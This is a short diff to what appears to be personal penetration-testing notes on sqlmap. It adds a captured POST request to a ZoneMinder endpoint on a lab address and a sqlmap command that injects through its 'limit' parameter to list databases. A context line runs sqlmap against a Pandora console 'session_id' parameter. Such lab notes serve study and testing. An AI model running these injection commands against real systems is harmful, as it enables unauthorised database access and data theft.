@@ -12,6 +12,38 @@ speed
 sqlmap -h
 ```
 
+---
+## 
+
+Using sqlmap
+
+- Captured requests via Burp and modified it.
+    
+
+Copy
+
+```
+POST /zm/index.php HTTP/1.1
+Host: 192.168.154.52
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+view=request&request=log&task=query&limit=100&minTime=1466674406.084434
+```
+
+Save as req.txt 
+
+```
+sqlmap -r req.txt -p limit --dbs --hex --batch
+```
+
+---
+
+
 ```
 sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -- current-db
 ```
